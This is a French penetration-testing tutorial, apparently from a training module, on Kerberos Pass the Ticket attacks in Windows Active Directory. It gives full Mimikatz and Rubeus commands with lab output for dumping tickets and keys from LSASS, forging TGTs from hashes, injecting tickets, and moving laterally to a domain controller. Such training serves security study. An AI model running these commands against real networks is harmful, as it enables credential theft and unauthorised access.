# PassTheTicket - version Windows

Une autre méthode de déplacement latéral dans un environnement Active Directory est appelée attaque Pass the Ticket (PtT). Dans cette attaque, nous utilisons un ticket Kerberos volé pour nous déplacer latéralement au lieu d'un hachage de mot de passe NTLM. Nous couvrirons plusieurs façons d'effectuer une attaque PtT à partir de Windows et Linux. Dans cette section, nous nous concentrerons sur les attaques de Windows, et dans la section suivante, nous couvrirons les attaques de Linux.

## Actualisation du protocole Kerberos
Le système d'authentification Kerberos est basé sur des tickets. L'idée centrale derrière Kerberos n'est pas de donner un mot de passe de compte à chaque service que vous utilisez. Au lieu de cela, Kerberos conserve tous les tickets sur votre système local et ne présente à chaque service que le ticket spécifique pour ce service, empêchant qu'un ticket soit utilisé à d'autres fins.

+ Le TGT - Ticket Granting Ticket est le premier ticket obtenu sur un système Kerberos. Le TGT permet au client d'obtenir des tickets Kerberos ou TGS supplémentaires.
+ Le TGS - Ticket Granting Service est demandé par les utilisateurs qui souhaitent utiliser un service. Ces tickets permettent aux services de vérifier l'identité de l'utilisateur.
Lorsqu'un utilisateur demande un TGT, il doit s'authentifier auprès du contrôleur de domaine en chiffrant l'horodatage actuel avec son hachage de mot de passe. Une fois que le contrôleur de domaine a validé l'identité de l'utilisateur (car le domaine connaît le hachage du mot de passe de l'utilisateur, ce qui signifie qu'il peut déchiffrer l'horodatage), il envoie à l'utilisateur un TGT pour les demandes futures. Une fois que l'utilisateur a son ticket, il n'a pas à prouver qui il est avec son mot de passe.

Si l'utilisateur souhaite se connecter à une base de données MSSQL, il demandera un Ticket Granting Service (TGS) au Key Distribution Center (KDC), en présentant son Ticket Granting Ticket (TGT). Ensuite, il donnera le TGS au serveur de base de données MSSQL pour authentification.

Il est recommandé de consulter la section Kerberos, DNS, LDAP, MSRPC du module Introduction à Active Directory pour un aperçu de haut niveau du fonctionnement de ce protocole.

## Passez l'attaque du ticket (PtT)

Nous avons besoin d'un ticket Kerberos valide pour effectuer un Pass the Ticket (PtT). Ça peut être:

+ Ticket de service (TGS - Ticket Granting Service) pour permettre l'accès à une ressource particulière.
+ Ticket Granting Ticket (TGT), que nous utilisons pour demander des tickets de service afin d'accéder à toute ressource dont l'utilisateur dispose de privilèges.
Avant d'effectuer une attaque Pass the Ticket (PtT), voyons quelques méthodes pour obtenir un ticket en utilisant Mimikatz et Rubeus.

# Scénario
Imaginons que nous sommes sur un pentest et que nous parvenons à hameçonner un utilisateur et à accéder à l'ordinateur de l'utilisateur. Nous avons trouvé un moyen d'obtenir des privilèges administratifs sur cet ordinateur et travaillons avec des droits d'administrateur locaux. Explorons plusieurs façons d'obtenir des tickets d'accès sur cet ordinateur et comment créer de nouveaux tickets.

## Collecte des tickets Kerberos à partir de Windows
Sous Windows, les tickets sont traités et stockés par le processus LSASS (Local Security Authority Subsystem Service). Par conséquent, pour obtenir un ticket d'un système Windows, vous devez communiquer avec LSASS et le demander. En tant qu'utilisateur non administrateur, vous ne pouvez obtenir que vos tickets, mais en tant qu'administrateur local, vous pouvez tout collecter.

Nous pouvons récolter tous les tickets d'un système en utilisant le module Mimikatz sekurlsa::tickets /export. Le résultat est une liste de fichiers avec l'extension .kirbi, qui contiennent les tickets.

### Mimikatz - Billets d'exportation
```
c:\tools> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug  6 2020 14:53:43
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::tickets /export

Authentication Id : 0 ; 329278 (00000000:0005063e)
Session           : Network from 0
User Name         : DC01$
Domain            : HTB
Logon Server      : (null)
Logon Time        : 7/12/2022 9:39:55 AM
SID               : S-1-5-18

         * Username : DC01$
         * Domain   : inlanefreight.htb
         * Password : (null)
         
        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?
         [00000000]
           Start/End/MaxRenew: 7/12/2022 9:39:55 AM ; 7/12/2022 7:39:54 PM ;
           Service Name (02) : LDAP ; DC01.inlanefreight.htb ; inlanefreight.htb ; @ inlanefreight.htb
           Target Name  (--) : @ inlanefreight.htb
           Client Name  (01) : DC01$ ; @ inlanefreight.htb
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             31cfa427a01e10f6e09492f2e8ddf7f74c79a5ef6b725569e19d614a35a69c07
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;5063e]-1-0-40a50000-DC01$@LDAP-DC01.inlanefreight.htb.kirbi !

        Group 2 - Ticket Granting Ticket

<SNIP>

mimikatz # exit
Bye!
c:\tools> dir *.kirbi

Directory: c:\tools

Mode                LastWriteTime         Length Name
----                -------------         ------ ----

<SNIP>

-a----        7/12/2022   9:44 AM           1445 [0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
-a----        7/12/2022   9:44 AM           1565 [0;3e7]-0-2-40a50000-DC01$@cifs-DC01.inlanefreight.htb.kirbi

<SNIP>

```

Les tickets qui se terminent par $ correspondent au compte d'ordinateur, qui a besoin d'un ticket pour interagir avec l'Active Directory. Les tickets utilisateurs comportent le nom de l'utilisateur, suivi d'un @ qui sépare le nom du service et le domaine, par exemple : [valeur aléatoire]-nomutilisateur@service-domaine.local.kirbi.

Nous pouvons également exporter des tickets en utilisant Rubeus et l'option dump. Cette option peut être utilisée pour vider tous les tickets (en cas d'exécution en tant qu'administrateur local). Rubeus dump, au lieu de nous donner un fichier, imprimera le ticket encodé au format base64. Nous ajoutons l'option /nowrap pour faciliter le copier-coller.

### Rubeus - Export Tickets
```
:\tools> Rubeus.exe dump /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0


Action: Dump Kerberos Ticket Data (All Users)

[*] Current LUID    : 0x6c680
    ServiceName           :  krbtgt/inlanefreight.htb
    ServiceRealm          :  inlanefreight.htb
    UserName              :  DC01$
    UserRealm             :  inlanefreight.htb
    StartTime             :  7/12/2022 9:39:54 AM
    EndTime               :  7/12/2022 7:39:54 PM
    RenewTill             :  7/19/2022 9:39:54 AM
    Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
    KeyType               :  aes256_cts_hmac_sha1
    Base64(key)           :  KWBMpM4BjenjTniwH0xw8FhvbFSf+SBVZJJcWgUKi3w=
    Base64EncodedTicket   :



  UserName                 : plaintext
  Domain                   : HTB
  LogonId                  : 0x6c680
  UserSID                  : S-1-5-21-228825152-3134732153-3833540767-1107
  AuthenticationPackage    : Kerberos
  LogonType                : Interactive
  LogonTime                : 7/12/2022 9:42:15 AM
  LogonServer              : DC01
  LogonServerDNSDomain     : inlanefreight.htb
  UserPrincipalName        : plaintext@inlanefreight.htb


    ServiceName           :  krbtgt/inlanefreight.htb
    ServiceRealm          :  inlanefreight.htb
    UserName              :  plaintext
    UserRealm             :  inlanefreight.htb
    StartTime             :  7/12/2022 9:42:15 AM
    EndTime               :  7/12/2022 7:42:15 PM
    RenewTill             :  7/19/2022 9:42:15 AM
    Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
    KeyType               :  aes256_cts_hmac_sha1
    Base64(key)           :  2NN3wdC4FfpQunUUgK+MZO8f20xtXF0dbmIagWP0Uu0=
    Base64EncodedTicket   :



<SNIP>
```

Il s'agit d'un moyen courant de récupérer des tickets à partir d'un ordinateur. Un autre avantage d'abuser des tickets Kerberos est la possibilité de falsifier nos propres tickets. Voyons comment nous pouvons faire cela en utilisant la technique OverPass the Hash ou Pass the Key.

## Passez la clé ou dépassez le hachage
La technique traditionnelle Pass the Hash (PtH) consiste à réutiliser un hachage de mot de passe NTLM qui ne touche pas Kerberos. L'approche Pass the Key ou OverPass the Hash convertit un hachage/clé (rc4_hmac, aes256_cts_hmac_sha1, etc.) pour un utilisateur joint au domaine en un Ticket-Granting-Ticket (TGT) complet. Cette technique a été développée par Benjamin Delpy et Skip Duckwall dans leur présentation Abuser de Microsoft Kerberos - Désolé, vous ne comprenez pas. Will Schroeder a également adapté son projet pour créer l'outil Rubeus.

Pour falsifier nos tickets, nous avons besoin du hash de l'utilisateur ; nous pouvons utiliser Mimikatz pour vider toutes les clés de chiffrement Kerberos des utilisateurs à l'aide du module sekurlsa::ekeys. Ce module énumérera tous les types de clé présents pour le package Kerberos.

### Mimikatz - Extraire les clés Kerberos
```
c:\tools> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug  6 2020 14:53:43
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::ekeys
<SNIP>

Authentication Id : 0 ; 444066 (00000000:0006c6a2)
Session           : Interactive from 1
User Name         : plaintext
Domain            : HTB
Logon Server      : DC01
Logon Time        : 7/12/2022 9:42:15 AM
SID               : S-1-5-21-228825152-3134732153-3833540767-1107

         * Username : plaintext
         * Domain   : inlanefreight.htb
         * Password : (null)
         * Key List :
           aes256_hmac       b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60
           rc4_hmac_nt       3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_hmac_old      3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_md4           3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_hmac_nt_exp   3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_hmac_old_exp  3f74aa8f08f712f09cd5177b5c1ce50f
<SNIP>
```

Maintenant que nous avons accès aux clés AES256_HMAC et RC4_HMAC, nous pouvons effectuer l'attaque OverPass the Hash ou Pass the Key en utilisant Mimikatz et Rubeus.

### Mimikatz - Passez la clé ou dépassez le hachage
```
c:\tools> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug  6 2020 14:53:43
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f

user    : plaintext
domain  : inlanefreight.htb
program : cmd.exe
impers. : no
NTLM    : 3f74aa8f08f712f09cd5177b5c1ce50f
  |  PID  1128
  |  TID  3268
  |  LSA Process is now R/W
  |  LUID 0 ; 3414364 (00000000:0034195c)
  \_ msv1_0   - data copy @ 000001C7DBC0B630 : OK !
  \_ kerberos - data copy @ 000001C7E20EE578
   \_ aes256_hmac       -> null
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 000001C7E2136BC8 (32) -> null
```

Cela créera une nouvelle fenêtre cmd.exe que nous pourrons utiliser pour demander l'accès à n'importe quel service que nous voulons dans le contexte de l'utilisateur cible.

Pour forger un ticket en utilisant Rubeus, nous pouvons utiliser le module asktgt avec le nom d'utilisateur, le domaine et le hachage qui peuvent être /rc4, /aes128, /aes256 ou /des. Dans l'exemple suivant, nous utilisons le hachage aes256 à partir des informations que nous collectons à l'aide de Mimikatz sekurlsa::ekeys.

### Rubeus - Passez la clé ou dépassez le hachage
```
:\tools> Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 3f74aa8f08f712f09cd5177b5c1ce50f
[*] Building AS-REQ (w/ preauth) for: 'inlanefreight.htb\plaintext'
[+] TGT request successful!
[*] base64(ticket.kirbi):



  ServiceName           :  krbtgt/inlanefreight.htb
  ServiceRealm          :  inlanefreight.htb
  UserName              :  plaintext
  UserRealm             :  inlanefreight.htb
  StartTime             :  7/12/2022 11:28:26 AM
  EndTime               :  7/12/2022 9:28:26 PM
  RenewTill             :  7/19/2022 11:28:26 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType               :  rc4_hmac
  Base64(key)           :  0TOKzUHdgBQKMk8+xmOV2w==
```

# Pass the Ticket (PtT)
Maintenant que nous avons des tickets Kerberos, nous pouvons les utiliser pour nous déplacer latéralement dans un environnement.

Avec Rubeus, nous avons effectué une attaque OverPass the Hash et récupéré le ticket au format base64. Au lieu de cela, nous pourrions utiliser le drapeau /ptt pour soumettre le ticket (TGT ou TGS) à la session de connexion en cours.

### Rubeus passe le billet
```
c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 3f74aa8f08f712f09cd5177b5c1ce50f
[*] Building AS-REQ (w/ preauth) for: 'inlanefreight.htb\plaintext'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      
      WqgJGwdIVEIuQ09NqRwwGqADAgECoRMwERsGa3JidGd0GwdodGIuY29t
[+] Ticket successfully imported!

  ServiceName           :  krbtgt/inlanefreight.htb
  ServiceRealm          :  inlanefreight.htb
  UserName              :  plaintext
  UserRealm             :  inlanefreight.htb
  StartTime             :  7/12/2022 12:27:47 PM
  EndTime               :  7/12/2022 10:27:47 PM
  RenewTill             :  7/19/2022 12:27:47 PM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType               :  rc4_hmac
  Base64(key)           :  PRG0wMmc4OznDz1YIAjdsA==
```

Notez qu'il affiche maintenant Ticket importé avec succès !.

Une autre méthode consiste à importer le ticket dans la session en cours à l'aide du fichier .kirbi du disque.

Utilisons un ticket exporté depuis Mimikatz et importons-le à l'aide de Pass the Ticket.

### Rubeus - Passe le ticket
```
c:\tools> Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi

 ______        _
(_____ \      | |
 _____) )_   _| |__  _____ _   _  ___
|  __  /| | | |  _ \| ___ | | | |/___)
| |  \ \| |_| | |_) ) ____| |_| |___ |
|_|   |_|____/|____/|_____)____/(___/

v1.5.0


[*] Action: Import Ticket
[+] ticket successfully imported!

c:\tools> dir \\DC01.inlanefreight.htb\c$
Directory: \\dc01.inlanefreight.htb\c$

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---         6/4/2022  11:17 AM                Program Files
d-----         6/4/2022  11:17 AM                Program Files (x86)

<SNIP>
```

Nous pouvons également utiliser la sortie base64 de Rubeus ou convertir un .kirbi en base64 pour effectuer l'attaque Pass the Ticket. Nous pouvons utiliser PowerShell pour convertir un .kirbi en base64.

```
PS c:\tools> [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))

<SNIP>
```

En utilisant Rubeus, nous pouvons effectuer un Pass the Ticket en fournissant la chaîne base64 au lieu du nom de fichier.

### Pass the Ticket - Base64 Format
```
c:\tools> Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/<SNIP>
 ______        _
(_____ \      | |
 _____) )_   _| |__  _____ _   _  ___
|  __  /| | | |  _ \| ___ | | | |/___)
| |  \ \| |_| | |_) ) ____| |_| |___ |
|_|   |_|____/|____/|_____)____/(___/

v1.5.0


[*] Action: Import Ticket
[+] ticket successfully imported!

c:\tools> dir \\DC01.inlanefreight.htb\c$
Directory: \\dc01.inlanefreight.htb\c$

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---         6/4/2022  11:17 AM                Program Files
d-----         6/4/2022  11:17 AM                Program Files (x86)

<SNIP>
```

Enfin, nous pouvons également effectuer l'attaque Pass the Ticket en utilisant le module Mimikatz kerberos::ptt et le fichier .kirbi qui contient le ticket que nous voulons importer.

### Mimikatz - Pass the Ticket
```
C:\tools> mimikatz.exe 

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug  6 2020 14:53:43
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"

* File: 'C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi': OK
mimikatz # exit
Bye!
c:\tools> dir \\DC01.inlanefreight.htb\c$
Directory: \\dc01.inlanefreight.htb\c$

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---         6/4/2022  11:17 AM                Program Files
d-----         6/4/2022  11:17 AM                Program Files (x86)

<SNIP>
```

## Passer le ticket avec PowerShell Remoting (Windows)
PowerShell Remoting nous permet d'exécuter des scripts ou des commandes sur un ordinateur distant. Les administrateurs utilisent souvent PowerShell Remoting pour gérer des ordinateurs distants sur le réseau. L'activation de PowerShell Remoting crée à la fois des écouteurs HTTP et HTTPS. L'écouteur s'exécute sur le port standard TCP/5985 pour HTTP et TCP/5986 pour HTTPS.

Pour créer une session PowerShell Remoting sur un ordinateur distant, vous devez disposer d'autorisations administratives, être membre du groupe Utilisateurs de gestion à distance ou disposer d'autorisations PowerShell Remoting explicites dans la configuration de votre session.

Supposons que nous trouvions un compte d'utilisateur qui n'a pas de privilèges administratifs sur un ordinateur distant mais qui est membre du groupe Utilisateurs de gestion à distance. Dans ce cas, nous pouvons utiliser PowerShell Remoting pour nous connecter à cet ordinateur et exécuter des commandes.

## Mimikatz - PowerShell Remoting avec Pass the Ticket
Pour utiliser PowerShell Remoting avec Pass the Ticket, nous pouvons utiliser Mimikatz pour importer notre ticket, puis ouvrir une console PowerShell et nous connecter à la machine cible. Ouvrons un nouveau cmd.exe et exécutons mimikatz.exe, puis importons le ticket que nous avons collecté en utilisant sekurlsa::tickets /export. Une fois le ticket importé dans notre session cmd.exe, nous pouvons lancer une invite de commande PowerShell à partir du même cmd.exe et utiliser la commande Enter-PSSession pour nous connecter à la machine cible.

### Mimikatz - Pass the Ticket for Lateral Movement.
```
C:\tools> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"

* File: 'C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi': OK

mimikatz # exit
Bye!

c:\tools>powershell
Windows PowerShell
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\tools> Enter-PSSession -ComputerName DC01
[DC01]: PS C:\Users\john\Documents> whoami
inlanefreight\john
[DC01]: PS C:\Users\john\Documents> hostname
DC01
[DC01]: PS C:\Users\john\Documents>
```

## Rubeus - PowerShell Remoting avec Pass the Ticket
Rubeus a l'option createnetonly, qui crée un processus sacrificiel/session de connexion (Logon type 9). Le processus est masqué par défaut, mais nous pouvons spécifier le drapeau /show pour afficher le processus, et le résultat est l'équivalent de runas /netonly. Cela empêche l'effacement des TGT existants pour la session de connexion en cours.

### Créer un processus sacrificiel avec Rubeus
```
C:\tools> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.3


[*] Action: Create process (/netonly)


[*] Using random username and password.

[*] Showing process : True
[*] Username        : JMI8CL7C
[*] Domain          : DTCDV6VL
[*] Password        : MRWI6XGI
[+] Process         : 'cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 1556
[+] LUID            : 0xe07648

```

La commande ci-dessus ouvrira une nouvelle fenêtre cmd. À partir de cette fenêtre, nous pouvons exécuter Rubeus pour demander un nouveau TGT avec l'option /ptt pour importer le ticket dans notre session en cours et nous connecter au DC à l'aide de PowerShell Remoting.


Rubeus - Passez le ticket pour le mouvement latéral
```
C:\tools> Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.3

[*] Action: Ask TGT

[*] Using aes256_cts_hmac_sha1 hash: 9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc
[*] Building AS-REQ (w/ preauth) for: 'inlanefreight.htb\john'
[*] Using domain controller: 10.129.203.120:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      
      ZWZyZWlnaHQuaHRi
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/inlanefreight.htb
  ServiceRealm             :  INLANEFREIGHT.HTB
  UserName                 :  john
  UserRealm                :  INLANEFREIGHT.HTB
  StartTime                :  7/18/2022 5:44:50 AM
  EndTime                  :  7/18/2022 3:44:50 PM
  RenewTill                :  7/25/2022 5:44:50 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  5VdAaevnpxx/f9rXsDDLfK6tH+4qQ3f1GlOB1ClBWh0=
  ASREP (key)              :  9279BCBD40DB957A0ED0D3856B2E67F9BB58E6DC7FC07207D0763CE2713F11DC

c:\tools>powershell
Windows PowerShell
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\tools> Enter-PSSession -ComputerName DC01
[DC01]: PS C:\Users\john\Documents> whoami
inlanefreight\john
[DC01]: PS C:\Users\john\Documents> hostname
DC01
```
